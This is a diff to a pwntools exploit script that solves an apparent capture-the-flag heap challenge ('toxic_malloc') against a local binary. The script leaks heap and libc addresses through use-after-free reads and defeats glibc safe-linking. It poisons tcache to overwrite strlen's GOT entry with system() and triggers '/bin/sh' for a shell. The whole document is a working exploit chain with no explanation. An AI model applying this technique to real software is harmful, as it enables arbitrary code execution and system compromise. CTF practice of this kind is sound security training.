@@ -1,6 +1,6 @@
 from pwn import *
 
-context.log_level = 'debug'
+# context.log_level = 'debug'
 context.terminal = ['tmux', 'new-window']
 
 rem = process("./Pwnable/toxic_malloc/problem/deploy/chall")
@@ -49,32 +49,30 @@ def delete(idx):
   rem.sendlineafter(b'choice:', b"4")
   rem.sendlineafter(b": ", str(idx).encode())
 
-create(0, b'A' * 8)
 create(1, b'A' * 8)
 create(4, b'A' * 8)
 
-delete(0)
-update(0, chr(ord('B')).encode() * 16)
-delete(0)
-heap_base = decrypt_safe_linking(u64(read(0).rstrip().ljust(8, b'\x00'))) - 0x2a0
+delete(1)
+update(1, p64(0) * 2)
+delete(1)
+heap_base = decrypt_safe_linking(u64(read(1).rstrip().ljust(8, b'\x00'))) - 0x2a0
+print(hex(heap_base))
 
 for i in range(1, 7):
-  update(0, chr(ord('B') + i).encode() * 16)
-  delete(0)
+  update(1, p64(0) * 2)
+  delete(1)
 
-lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
-strlen_got = lib_base + lib.got['strlen']
+lib_base = u64(read(1).rstrip().ljust(8, b'\x00')) - 0x21ace0
+strlen_got = lib_base + lib.got['strlen'] - 8
 sys_addr = lib_base + lib.symbols['system']
 print(hex(strlen_got))
 
-delete(1)
-update(1, b"B" * 16)
-# delete(1)
-create(1, p64(safe_link(heap_base+0x2a0, strlen_got)))
-# gdb.attach(rem)
-# create(2, b"A" * 16)
-# create(3, p64(sys_addr))
-# update(0, b"/bin/sh\x00")
-# read(0)
+update(1, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+create(0, p64(safe_link(heap_base+0x2a0, strlen_got)))
+create(2, b"A" * 16)
+create(3, p64(sys_addr)*2)
+update(2, b"/bin/sh\x00")
+read(2)
 
+gdb.attach(rem)
 rem.interactive()
